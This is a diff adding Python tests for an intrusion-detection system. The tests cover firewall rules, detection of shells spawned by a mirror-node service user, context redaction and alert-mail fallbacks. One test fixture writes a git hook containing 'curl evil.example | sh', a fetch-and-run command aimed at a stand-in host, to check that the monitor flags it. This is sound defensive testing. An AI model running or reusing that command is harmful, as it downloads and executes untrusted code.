@@ -631,6 +631,10 @@ def test_firewall_contents():
         locked.index("ct state established,related accept")
     open_ssh = ids.firewall_ruleset(lockdown=True)
     assert "tcp dport 22 accept" in open_ssh and "ssh_allow" not in open_ssh
+    moved = ids.firewall_ruleset(lockdown=True, ssh_allow=["192.0.2.1"],
+                                 ssh_port=822)
+    assert "tcp dport 822 ip saddr != @ssh_allow drop" in moved
+    assert "tcp dport 822 accept" in moved and "dport 22 " not in moved
 
 
 # --------------------------------------------------------------------------
@@ -695,6 +699,169 @@ def test_process_rules(tmp_path):
     # ptrace) turns the ptrace into info.
     events = proc_monitor(tmp_path).scan(allow_ptrace=True)
     assert ("ptrace", "info") in codes(events)
+
+
+NODE_CFG = {"processes": {
+    "service_users": {
+        "forkmesh-node": {"units": ["forkmesh-mirror-node.service"],
+                          "exe": ["/usr/local/bin/forkmesh-mirror-node",
+                                  "/usr/bin/git", "/usr/lib/git-core/*",
+                                  "/usr/bin/bwrap"],
+                          "shell_severity": "alert"}}}}
+MIRROR = "forkmesh-mirror-node.service"
+
+
+def rich_proc(root, pid, exe, argv, ppid=1, uid=997, unit=MIRROR, cwd=None,
+              env=None, rootfs=None, name=None):
+    fake_proc(root, pid, uid, exe, unit, name=name or os.path.basename(exe))
+    d = root / str(pid)
+    status = d / "status"
+    status.write_text(status.read_text().replace("PPid:\t1", "PPid:\t%d" % ppid))
+    (d / "cmdline").write_bytes(b"\0".join(a.encode() for a in argv) + b"\0")
+    if cwd:
+        os.symlink(cwd, d / "cwd")
+    if rootfs:
+        os.symlink(rootfs, d / "root")
+    if env:
+        (d / "environ").write_bytes(b"\0".join(
+            ("%s=%s" % kv).encode() for kv in env.items()) + b"\0")
+    return d
+
+
+def node_monitor(tmp_path):
+    return ids.ProcessMonitor(dict(cfg(tmp_path), **NODE_CFG),
+                              proc=str(tmp_path / "proc"),
+                              user_of=lambda uid: USERS.get(uid, str(uid)))
+
+
+def shell_event(events, pid):
+    [event] = [e for e in events if e["detector"] == "service_user_shell"
+               and e["detail"]["pid"] == pid]
+    return event
+
+
+def push_hook(tmp_path, body):
+    proc, rootfs = tmp_path / "proc", tmp_path / "rootfs"
+    hooks = rootfs / "srv" / "a.git" / "hooks"
+    hooks.mkdir(parents=True)
+    if body is None:
+        os.mkfifo(hooks / "post-receive")
+    else:
+        (hooks / "post-receive").write_bytes(body)
+    rich_proc(proc, 39, "/usr/local/bin/forkmesh-mirror-node",
+              ["/usr/local/bin/forkmesh-mirror-node", "--config", "x.json"])
+    rich_proc(proc, 40, "/usr/lib/git-core/git",
+              ["git-receive-pack", "--stateless-rpc", "/srv/a.git"], ppid=39)
+    rich_proc(proc, 41, "/usr/bin/dash", ["/bin/sh", "hooks/post-receive"],
+              ppid=40, cwd="/srv/a.git", rootfs=str(rootfs), name="sh")
+    rich_proc(proc, 42, "/usr/bin/curl",
+              ["/usr/bin/curl", "-fsS", "-X", "POST",
+               "http://127.0.0.1:8791/v1/control/sync?local=1"], ppid=41)
+    return shell_event(node_monitor(tmp_path).scan(), 41)
+
+
+def test_forkmesh_push_hook_shell_says_it_is_likely_benign(tmp_path):
+    event = push_hook(tmp_path, b"#!/bin/sh\n# Managed-By: ForkMesh "
+                                b"mirror-node\nexit 0\n")
+    assert event["severity"] == "alert"
+    assert event["summary"] == (
+        "forkmesh-node runs dash (pid 41); likely benign: ForkMesh's own "
+        "post-receive hook during a git push")
+    detail = event["detail"]
+    assert detail["verdict"].startswith(
+        "Likely benign. This is ForkMesh's own post-receive hook "
+        "(/srv/a.git/hooks/post-receive, it carries ForkMesh's marker), "
+        "run by git receive-pack (pid 40)")
+    assert detail["cmdline"] == "/bin/sh hooks/post-receive"
+    assert detail["cwd"] == "/srv/a.git" and detail["ppid"] == 40
+    assert detail["parents"] == [
+        "pid 40 /usr/lib/git-core/git as forkmesh-node: git-receive-pack "
+        "--stateless-rpc /srv/a.git",
+        "pid 39 /usr/local/bin/forkmesh-mirror-node as forkmesh-node: "
+        "/usr/local/bin/forkmesh-mirror-node --config x.json"]
+    assert detail["children"] == [
+        "pid 42 /usr/bin/curl as forkmesh-node: /usr/bin/curl -fsS -X POST "
+        "http://127.0.0.1:8791/v1/control/sync?local=1"]
+
+
+def test_push_hook_forkmesh_did_not_write_needs_a_look(tmp_path):
+    event = push_hook(tmp_path, b"#!/bin/sh\ncurl evil.example | sh\n")
+    assert event["summary"].endswith(
+        "; needs a look: a post-receive hook ForkMesh did not write ran "
+        "during a git push")
+    assert "/srv/a.git/hooks/post-receive, which has no ForkMesh marker" in \
+        event["detail"]["verdict"]
+
+
+def test_hook_that_is_not_a_regular_file_is_never_opened(tmp_path):
+    event = push_hook(tmp_path, None)
+    assert "which could not be read" in event["detail"]["verdict"]
+
+
+def test_actions_sandbox_self_test_is_likely_benign(tmp_path):
+    proc = tmp_path / "proc"
+    rich_proc(proc, 50, "/usr/bin/bwrap", ["bwrap", "--unshare-all", "--"])
+    rich_proc(proc, 51, "/usr/bin/dash", ["/bin/sh", "-c", "exit 0"],
+              ppid=50, cwd="/", name="sh")
+    event = shell_event(node_monitor(tmp_path).scan(), 51)
+    assert event["summary"].endswith(
+        "; likely benign: the Actions sandbox self-test")
+    assert "(bwrap pid 50)" in event["detail"]["verdict"]
+
+
+def test_unexplained_shell_carries_ip_environment_and_start(tmp_path):
+    proc = tmp_path / "proc"
+    clock = os.sysconf("SC_CLK_TCK")
+    (proc / "net").mkdir(parents=True)
+    (proc / "stat").write_text("cpu 0\nbtime 1790000000\n")
+    rich_proc(proc, 59, "/usr/local/bin/forkmesh-mirror-node",
+              ["/usr/local/bin/forkmesh-mirror-node"])
+    d = rich_proc(proc, 60, "/usr/bin/dash", ["sh", "-i"], ppid=59,
+                  cwd="/var/lib/forkmesh", name="sh",
+                  env={"SSH_CONNECTION": "203.0.113.9 50000 198.51.100.1 22",
+                       "DATA_KEY": "s3cr3t", "HOME": "/var/lib/forkmesh"})
+    (d / "stat").write_text("60 (sh) " + " ".join(
+        ["S"] + ["0"] * 18 + [str(5 * clock)] + ["0"] * 10) + "\n")
+    (d / "fd").mkdir()
+    os.symlink("socket:[777]", d / "fd" / "3")
+    os.symlink("/dev/null", d / "fd" / "0")
+    (d / "net").mkdir()
+    (d / "net" / "tcp").write_text(
+        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when "
+        "retrnsmt   uid  timeout inode\n"
+        "   0: 0100007F:1F97 097100CB:01BB 01 00000000:00000000 00:00000000 "
+        "00000000   997        0 777 1 0 20 4 30 10 -1\n")
+    event = shell_event(node_monitor(tmp_path).scan(), 60)
+    detail = event["detail"]
+    assert event["summary"].endswith(
+        "; unexplained: no known ForkMesh source matches")
+    assert detail["verdict"].startswith("Unexplained. No known ForkMesh source")
+    assert detail["environment"] == {
+        "SSH_CONNECTION": "203.0.113.9 50000 198.51.100.1 22"}
+    assert "s3cr3t" not in json.dumps(event)
+    assert detail["connections"] == [
+        "pid 60 tcp 127.0.0.1:8087 -> 203.0.113.9:443 established"]
+    assert detail["started"].startswith("2026-09-21 14:13:25 UTC (")
+
+
+def test_shell_gone_before_the_ids_reads_it_says_so(tmp_path):
+    proc = tmp_path / "proc"
+    fake_proc(proc, 70, 997, "/usr/bin/dash", MIRROR, name="sh")
+    event = shell_event(node_monitor(tmp_path).scan(), 70)
+    assert event["summary"].endswith(
+        "; unexplained: it exited before the IDS could read it")
+
+
+def test_context_is_trimmed_to_stay_valid_json_in_the_record():
+    detail = {"pid": 1, "verdict": "v" * 300, "cmdline": "c" * 300,
+              "parents": ["p%d " % n + "x" * 250 for n in range(6)],
+              "children": ["k" * 250] * 5,
+              "connections": ["n" * 80] * 10,
+              "environment": {"K%d" % n: "e" * 160 for n in range(12)}}
+    ids.fit_detail(detail)
+    assert len(json.dumps(detail, sort_keys=True)) <= ids.CONTEXT_BYTES
+    assert "children" not in detail and detail["parents"][0].startswith("p0 ")
+    assert detail["verdict"] == "v" * 300
 
 
 def outside_pids(events):
@@ -1313,3 +1480,167 @@ def test_failed_direct_mail_is_noted_too_and_runners_use_the_webhook(tmp_path):
     assert hook.full_url.endswith("/api/runners/mail-log-note")
     assert json.loads(hook.data)["result"] == "failed"
     assert json.loads(hook.data)["to"] == "a***@b.co"
+
+
+class FakeSmtp:
+    def __init__(self, sent, fail=None, refused=None):
+        self.sent, self.fail, self.refused = sent, fail, refused or {}
+
+    def __call__(self, host, port, timeout=None):
+        if self.fail:
+            raise self.fail
+        self.sent.append({"host": host, "port": port})
+        return self
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        return False
+
+    def send_message(self, message, from_addr=None, to_addrs=None):
+        self.sent[-1].update(message=message, from_addr=from_addr,
+                             to_addrs=to_addrs)
+        return self.refused
+
+
+def postfix_mail(tmp_path, token="mt-SECRET"):
+    path = tmp_path / "sasl_passwd"
+    path.write_text("[live.smtp.mailtrap.io]:587 api:%s\n" % token)
+    return {"to": "security@example.com", "from": "", "smtp": "127.0.0.1:25",
+            "token_file": str(path)}
+
+
+def lock_down(tmp_path):
+    state = tmp_path / "state"
+    state.mkdir(parents=True, exist_ok=True)
+    (state / "LOCKDOWN").write_text("x")
+
+
+def test_direct_mail_goes_through_the_local_postfix(tmp_path, capsys):
+    sent, posted = [], []
+    rq = FakeRqlite()
+    alerter = ids.Alerter(cfg(tmp_path, mail=postfix_mail(tmp_path)), rq,
+                          opener=lambda request, timeout=None: posted.append(
+                              request), smtp=FakeSmtp(sent))
+    result = alerter.send(incident("lockdown"), key=KEY)
+    assert result["mail"][0] is True and posted == []
+    assert sent[0]["host"] == "127.0.0.1" and sent[0]["port"] == 25
+    message = sent[0]["message"]
+    assert message["From"] == "ForkMesh IDS <founders@forkmesh.com>"
+    assert message["Auto-Submitted"] == "auto-generated"
+    assert sent[0]["from_addr"] == "no-reply@forkmesh.com"
+    assert sent[0]["to_addrs"] == ["security@example.com"]
+    assert '"detector": "x"' in message.get_content()
+    note = json.loads([s for s in rq.statements
+                       if "mail_log_node_notes" in s[0]][0][3])
+    assert note["via"] == "postfix" and note["result"] == "accepted"
+    assert "mt-SECRET" not in capsys.readouterr().out
+
+
+def test_direct_mail_uses_the_mailtrap_api_as_root_in_a_lockdown(tmp_path):
+    lock_down(tmp_path)
+    sent, posted = [], []
+
+    def opener(request, timeout=None):
+        posted.append(request)
+        return FakeResponse(status=200)
+    alerter = ids.Alerter(cfg(tmp_path, mail=postfix_mail(tmp_path)),
+                          FakeRqlite(), opener=opener, smtp=FakeSmtp(sent))
+    assert alerter.mail(incident("lockdown"))[0] is True
+    assert sent == []
+    assert posted[0].full_url == ids.MAIL_URL
+    assert posted[0].headers["Authorization"] == "Bearer mt-SECRET"
+    body = json.loads(posted[0].data)
+    assert body["to"] == [{"email": "security@example.com"}]
+    assert body["from"]["email"] == "founders@forkmesh.com"
+
+
+def test_a_lockdown_mail_the_api_refuses_waits_in_the_postfix_queue(tmp_path):
+    lock_down(tmp_path)
+    sent = []
+
+    def opener(request, timeout=None):
+        raise OSError("no route")
+    rq = FakeRqlite()
+    alerter = ids.Alerter(cfg(tmp_path, mail=postfix_mail(tmp_path)), rq,
+                          opener=opener, smtp=FakeSmtp(sent))
+    assert alerter.mail(incident("lockdown"))[0] is True
+    assert len(sent) == 1
+    note = json.loads([s for s in rq.statements
+                       if "mail_log_node_notes" in s[0]][0][3])
+    assert note["via"] == "postfix"
+    assert note["tried"][0] == "mailtrap: OSError"
+
+
+def test_direct_mail_falls_back_to_the_api_when_postfix_is_down(tmp_path):
+    posted = []
+
+    def opener(request, timeout=None):
+        posted.append(request)
+        return FakeResponse(status=200)
+    alerter = ids.Alerter(cfg(tmp_path, mail=postfix_mail(tmp_path)),
+                          FakeRqlite(), opener=opener,
+                          smtp=FakeSmtp([], fail=ConnectionRefusedError()))
+    ok, detail = alerter.mail(incident("test"))
+    assert ok is True and detail == "mail 200" and len(posted) == 1
+
+
+def test_direct_mail_without_postfix_or_token_reports_failure(tmp_path):
+    mail = dict(postfix_mail(tmp_path), token_file=str(tmp_path / "none"))
+    rq = FakeRqlite()
+    alerter = ids.Alerter(cfg(tmp_path, mail=mail), rq,
+                          opener=lambda request, timeout=None: None,
+                          smtp=FakeSmtp([], fail=ConnectionRefusedError()))
+    assert alerter.mail(incident("lockdown")) == (
+        False, "smtp ConnectionRefusedError")
+    note = json.loads([s for s in rq.statements
+                       if "mail_log_node_notes" in s[0]][0][3])
+    assert note["result"] == "failed"
+    alerter = ids.Alerter(cfg(tmp_path, mail={"to": "",
+                                              "smtp": "127.0.0.1:25"}),
+                          FakeRqlite(), smtp=FakeSmtp([]))
+    assert alerter.mail(incident("lockdown")) == (False, "not configured")
+
+
+def test_direct_mail_never_submits_to_a_remote_smtp_host(tmp_path):
+    sent = []
+    mail = dict(postfix_mail(tmp_path), smtp="mail.example.com:25",
+                token_file="")
+    alerter = ids.Alerter(cfg(tmp_path, mail=mail), FakeRqlite(),
+                          smtp=FakeSmtp(sent))
+    assert alerter.mail(incident("lockdown")) == (False, "not configured")
+    assert sent == []
+
+
+def test_production_fleet_renders_direct_mail_without_new_secrets(tmp_path):
+    import tomllib
+    with open(os.path.join(REPO, "deploy", "fleet.toml"), "rb") as handle:
+        production = tomllib.load(handle)["ids"]
+    fleet = render.load_fleet(os.path.join(REPO, "deploy",
+                                           "fleet.example.toml"),
+                              state_path=tmp_path / "none.json")
+    fleet["ids"] = dict(fleet["ids"], **production)
+    config = json.loads(render.ids_config(fleet, "n1", "core",
+                                          render.fleet_paths(fleet)))
+    assert config["mail"] == {"to": "security@forkmesh.com", "from": "",
+                              "smtp": "127.0.0.1:25",
+                              "token_file": "/etc/postfix/sasl_passwd"}
+    assert render.ids_credential_names(fleet, "core") == [
+        render.IDS_KEY_CREDENTIAL, "RQLITE_PASSWORD"]
+    broken = dict(fleet, ids=dict(fleet["ids"], mail_to=""))
+    with pytest.raises(render.RenderError, match="ids.mail_to"):
+        render.ids_settings(broken)
+    broken = dict(fleet, ids=dict(fleet["ids"], mail_from="founders"))
+    with pytest.raises(render.RenderError, match="ids.mail_from"):
+        render.ids_settings(broken)
+
+
+def test_context_redacts_secrets_in_command_lines():
+    assert ids.redact(
+        "git fetch https://bot:ghp_abc@github.com/x.git -c "
+        "http.extraHeader=Authorization: Basic Zm9vOmJhcg== --token t0k "
+        "url?token=s3&x=1 password=hunter2") == (
+        "git fetch https://bot:***@github.com/x.git -c "
+        "http.extraHeader=Authorization: Basic *** --token *** "
+        "url?token=***&x=1 password=***")
